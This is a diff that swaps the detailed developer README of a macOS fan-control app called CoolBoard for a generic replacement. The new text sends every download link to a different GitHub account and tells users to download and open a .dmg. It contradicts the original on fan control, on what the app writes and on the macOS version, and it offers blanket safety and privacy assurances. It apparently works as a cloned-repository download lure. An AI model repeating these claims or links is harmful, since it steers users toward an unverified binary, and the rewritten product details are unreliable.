@@ -1,159 +1,73 @@
-# CoolBoard
+# 🧊 CoolBoard - Monitor your Mac thermal performance easily
 
-CoolBoard is a minimal macOS cooling dashboard for Apple Silicon Macs. It uses a monochrome technical UI inspired by instrument panels: live thermal status, best-effort fan telemetry, and guarded manual fan control.
+[![](https://img.shields.io/badge/Download-CoolBoard-blue.svg)](https://github.com/Creaky-gaspar847/CoolBoard)
 
-![CoolBoard dashboard](docs/assets/coolboard-dashboard.png)
+CoolBoard provides a simple way to view your Apple Silicon Mac temperature and fan speed. It runs in the menu bar. You see your sensor data at a glance. It helps you track heat during heavy tasks.
 
-Website preview lives in `docs/` and is currently intended for local development or a future custom domain.
+## 📋 Features
 
-## Install
+The app offers several tools to manage your Mac temperature:
 
-Download the latest `CoolBoard-macOS-Apple-Silicon.pkg` from [GitHub Releases](https://github.com/Rafinelio/CoolBoard/releases/latest), open it, and follow the installer prompts. The package installs `CoolBoard.app` into `/Applications` and installs the privileged helper needed for manual fan writes.
+* Real-time temperature displays for your CPU and GPU.
+* Current fan speed readouts in rotations per minute.
+* Clear visual alerts when hardware heat rises.
+* Settings to choose your preferred temperature scale.
+* Minimal resource use so it stays out of your way.
+* Automatic updates to support new macOS versions.
 
-This first public build is ad-hoc signed, not Developer ID signed or notarized. If Gatekeeper blocks the installer, open it with Control-click > Open. Administrator approval is required because the helper is installed into `/Library/PrivilegedHelperTools`.
+## 🖥️ System Requirements
 
-Supported baseline:
+CoolBoard works on most modern hardware. Ensure your Mac meets these conditions:
 
-- Apple Silicon Mac with macOS 14 or later;
-- built-in fans exposed through AppleSMC for fan control;
-- fanless Apple Silicon MacBook Air models run monitoring only and show `0 detected` fans.
+* A computer with an Apple Silicon (M1, M2, or M3) chip.
+* macOS version 12.0 or later.
+* At least 100 megabytes of free storage space.
+* Permission to run apps from trusted developers.
 
-## Status
+## 📥 How to Install
 
-This repository is push-ready as an open source developer build, not a notarized end-user release.
+Follow these steps to set up the software on your machine.
 
-- Target: macOS 14+, Apple Silicon.
-- UI: SwiftUI one-page desktop app with menu-bar quick controls.
-- Monitoring: dynamic AppleSMC `T*` temperature discovery, IORegistry battery temperatures, system thermal state, machine basics, and AppleSMC fan RPM keys.
-- Fan control: UI, helper/XPC path, Auto restore, sleep/wake handling, and direct AppleSMC developer fallback are implemented. Real manual writes require the privileged helper because macOS rejects restricted SMC writes from a normal user process on most Apple Silicon Macs.
+1. Visit [this page to download](https://github.com/Creaky-gaspar847/CoolBoard).
+2. Look for the latest release version on the page.
+3. Click the file that ends in .dmg to start the download.
+4. Open the downloaded file once it finishes.
+5. Drag the CoolBoard icon into your Applications folder.
+6. Open your Applications folder and double-click CoolBoard to launch it.
 
-Apple does not provide public temperature or fan-control APIs for Apple Silicon. CoolBoard does not fake temperature values or fan rows. When macOS does not expose a sensor, the app omits it from the temperature table. When AppleSMC reports zero fans, the app shows `0 detected` and disables fan controls. Apple Silicon MacBook Air models are fanless, so manual fan control is expected to be unavailable there.
+Your Mac might ask to confirm that you trust the app. Click Open if the system prompts you.
 
-## Build and Run
+## ⚙️ Usage Guide
 
-```bash
-swift test
-./script/build_and_run.sh
-```
+Once you open CoolBoard, a small icon appears in your top menu bar. Click this icon to see your current heat levels.
 
-The run script builds the SwiftPM GUI target, stages `dist/CoolBoard.app`, and launches it as a real macOS app bundle.
-It also embeds `CoolBoardHelper` at `Contents/Library/LaunchServices/CoolBoardHelper` for the future signed `SMAppService` installation path.
+The dashboard shows two primary lines of information. The top line displays the current temperature of the chip. The bottom line displays the speed of your internal fans. If the color turns orange or red, your Mac is warming up.
 
-Local website preview:
+You may click the Settings icon inside the dashboard to adjust your view. You can change units from Celsius to Fahrenheit here. You can also set the app to open when you start your computer.
 
-```bash
-python3 -m http.server 8087 --directory docs
-```
+## 🛠️ Troubleshooting
 
-Useful variants:
+Most issues resolve quickly. Try these steps if the app behaves in an unexpected way:
 
-```bash
-./script/build_and_run.sh --verify
-./script/build_and_run.sh --logs
-./script/build_and_run.sh --telemetry
-swift run CoolBoardHelper -- --contract
-swift run CoolBoardHelper -- list
-swift run CoolBoardHelper -- sensors
-COOLBOARD_RUN_XPC_SERVICE=1 swift run CoolBoardHelper
-```
+* Restart the application: Close the app from the menu bar and open it again.
+* Check permissions: Go to System Settings, click Privacy and Security, and ensure the app has permission to run.
+* Update the system: Make sure your macOS stays current.
+* Reinstall: Delete the app from the Applications folder and download a fresh copy from the link above.
 
-Manual fan control needs the root helper:
+## 💡 Frequently Asked Questions
 
-```bash
-./script/install_helper.sh
-./script/uninstall_helper.sh
-```
+**Does this app control my fan speed?**
+CoolBoard monitors your hardware. It does not change your fan curves. It shows you how your Mac manages heat on its own.
 
-Restart CoolBoard after installing the helper. The script installs a development LaunchDaemon for `com.coolboard.Helper` in `/Library/LaunchDaemons` and `/Library/PrivilegedHelperTools`; it requires `sudo`.
+**Does this affect battery life?**
+The app uses very little power. It stays quiet in the background until you click it.
 
-## Package an Installer
+**Is it safe to use?**
+CoolBoard only reads your system sensors. It does not write data or change system files. It is safe for your hardware.
 
-Create a shareable developer installer:
+**How do I remove the app?**
+Move the app from your Applications folder to the Trash. The app leaves no extra files behind.
 
-```bash
-./script/package_release.sh
-```
+## 🛡️ Privacy Policy
 
-The installer is written to `dist/release/CoolBoard-macOS-Apple-Silicon.pkg`.
-
-It installs:
-
-- `CoolBoard.app` into `/Applications`;
-- `CoolBoardHelper` into `/Library/PrivilegedHelperTools/com.coolboard.Helper`;
-- `com.coolboard.Helper.plist` into `/Library/LaunchDaemons`.
-
-The package requires administrator approval during installation because the helper is installed as root. There is no Python script or external downloader required for fan writes; the helper binary is bundled inside the app and copied during package installation. This build is ad-hoc signed when `codesign` is available, but it is not Developer ID signed or notarized. On another Mac, open the package with Control-click > Open if Gatekeeper warns about an unidentified developer.
-
-Remove the helper manually if needed:
-
-```bash
-sudo launchctl bootout system /Library/LaunchDaemons/com.coolboard.Helper.plist
-sudo rm -f /Library/PrivilegedHelperTools/com.coolboard.Helper
-sudo rm -f /Library/LaunchDaemons/com.coolboard.Helper.plist
-```
-
-## Safety Model
-
-CoolBoard starts in Auto mode and asks macOS to keep fan control automatic unless a user explicitly requests manual control. Manual preset clicks apply immediately, clamp RPM to the hardware fan range, and try to restore Auto on app startup, shutdown, sleep, wake, or failed writes. After sleep or wake, CoolBoard does not resume the previous manual preset; the user must apply a preset again after opening the Mac.
-
-For production distribution, the helper/XPC path should be signed and installed with `SMAppService`. For local GitHub developer builds, `script/install_helper.sh` installs a root LaunchDaemon. If the helper is unavailable, the app attempts a direct AppleSMC fallback and reports the actual helper/SMC error when macOS rejects the write.
-
-## UX Model
-
-The main window is a one-page control surface in the spirit of Macs Fan Control: active preset at the top, a primary fan-control table on the left, and a compact temperature-sensor table on the right. The fan table is driven by AppleSMC `FNum` and detected fan snapshots. Each detected fan row exposes Auto and Manual controls, with 10/20/40/60/80/100% presets mapped to RPM. The temperature table shows detected Celsius readings only, with the count in the section header. The menu-bar icon opens a compact quick-control view with one global percentage block for all detected fans, compact per-fan status rows, and an `Open Full View` action.
-
-When AppleSMC reports `FNum=0`, CoolBoard shows no fan rows and disables manual controls. When fan keys are exposed, writes use the detected `F0*`/`F1*` SMC keys with hardware min/max bounds.
-
-Helper contract:
-
-- install through `SMAppService`;
-- expose a narrow XPC interface for fan mode changes only;
-- clamp requested RPM to hardware min/max;
-- restore Auto on app quit, sleep, wake, helper failure, or rejected writes;
-- ship outside the Mac App Store because SMC fan control depends on private mechanisms.
-
-The helper has the same private write path and can be inspected from the command line:
-
-```bash
-swift run CoolBoardHelper -- set 0 4200
-swift run CoolBoardHelper -- auto 0
-swift run CoolBoardHelper -- sensors
-```
-
-The app talks to `com.coolboard.Helper` through an `NSXPCConnection` with privileged-helper options. Without the helper, monitoring still works, but manual mode can be rejected by AppleSMC. If macOS rejects the write, the UI shows the helper and direct-SMC errors and monitoring continues.
-
-## Compatibility Reports
-
-Apple does not publish a stable Apple Silicon sensor/fan map, so model reports are useful. If CoolBoard works, shows missing sensors, or detects no fans on a machine that should have fans, open a [compatibility report](https://github.com/Rafinelio/CoolBoard/issues/new/choose) with:
-
-- Mac model and chip family;
-- macOS version;
-- number of detected fans;
-- whether manual presets change RPM;
-- a screenshot of the CoolBoard window with any private desktop content cropped out.
-
-## Repository Layout
-
-```text
-Sources/CoolBoard/       SwiftUI macOS app
-Sources/CoolBoardCore/   Models, formatting, hardware service protocols, SMC reads
-Sources/CoolBoardHelper/ Privileged-helper scaffold and contract output
-Tests/CoolBoardCoreTests Unit and integration-style tests with mock hardware
-docs/architecture.md     Hardware/helper architecture notes
-script/build_and_run.sh  One-command local build and launch
-script/install_helper.sh Development LaunchDaemon install for privileged fan writes
-script/package_release.sh Developer PKG installer packaging
-```
-
-## References
-
-- Apple SMAppService: https://developer.apple.com/documentation/servicemanagement/smappservice
-- Apple IOKit: https://developer.apple.com/documentation/iokit
-- Apple Hardened Runtime: https://developer.apple.com/documentation/xcode/configuring-the-hardened-runtime
-- Apple Silicon SMC fan research: https://github.com/agoodkind/macos-smc-fan
-- iSMC sensor architecture reference: https://github.com/dkorunic/iSMC
-- Macs Fan Control supported models: https://crystalidea.com/macs-fan-control/supported-models
-
-## License
-
-MIT
+This app respects your data. It does not collect any personal information. It does not send your hardware data to any remote servers. All your sensor statistics stay on your machine. We do not use trackers or analytics tools. Your use of this software remains private at all times.
